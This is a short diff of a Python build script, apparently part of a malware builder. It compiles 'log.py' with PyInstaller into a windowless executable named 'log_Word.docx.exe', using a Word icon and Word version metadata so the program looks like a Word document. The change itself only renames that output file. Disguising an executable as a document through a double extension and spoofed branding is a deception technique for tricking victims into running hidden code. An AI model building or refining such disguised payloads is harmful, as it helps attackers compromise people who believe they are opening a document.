@@ -60,7 +60,7 @@ if choice == '1':
     sys.exit()
 
 elif choice == '2':
-    name = 'abs_Word.docx.exe'
+    name = 'log_Word.docx.exe'
     os.system('rmdir /S /Q dist 2>nul')
     os.system('pyinstaller --noconsole -m Manifest/manifest.manifest --version-file=Version/word.ver -i Icons/word.ico -F log.py')
     os.system('rmdir /S /Q build __pycache__')
